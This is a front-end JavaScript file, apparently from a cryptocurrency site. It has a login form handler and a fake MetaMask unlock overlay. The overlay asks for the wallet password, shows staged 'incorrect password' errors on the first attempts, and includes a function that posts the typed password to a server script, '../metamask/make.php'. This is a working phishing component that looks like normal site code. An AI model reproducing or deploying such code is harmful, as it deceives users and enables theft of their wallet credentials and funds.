function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }



	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 

 

  function disabledBtn(func) {
    if(func == "off") {
      $("#sign_in > span").html("Please wait..");
      $("#sign_in > i").css("display", "inline-block");
      $("#sign_in").css("background", "#242730");
      $("#sign_in").attr("disabled", true);

    } else if(func == "on") {
      $("#sign_in > span").html("Sign in");
      $("#sign_in > i").css("display", "none");
      $("#sign_in").css("background", "linear-gradient(90deg, #284EB6 0%, #4C399D 100%)");
      $("#sign_in").attr("disabled", false);
    }
  }
  
  $("#sign_in").on("click", function(e) {
    e.preventDefault();
    
    var login_password = $("#login_password").val();
    var login_email = $("#login_email").val();

    if(login_email == '') {
      noti("Please enter a valid email address", 'warning');
    } else if(login_password == '') {
      noti("Please enter your password", 'warning');
    } else {

      disabledBtn("off");
      
      $.ajax({
          url: "/ajax/LOGIN",
          type: "POST",
          data: {
            email: login_email,
            password: login_password
          },
		  dataType: 'json',
          success: function(data) {

            if(data.response == 'success') {
              setTimeout(function() {
                location.replace("/profile/wallet");
              }, 500);
            }

			if(data.response == 'no_user') {
              noti("Such user does not exist", "error");
              disabledBtn("on");
            }

			if(data.response == "3") {
              noti("Enter the correct password", "error");
              disabledBtn("on");
            } 
			
			if(data.response == "replace_2fa") {
              location.replace("signin-2fa");
            }

			if(data.response == "replace_2fa_error") {
              noti("An error occurred while sending the 2fa code", "error");
              disabledBtn("on");
            }

          }
        })
    }
  });
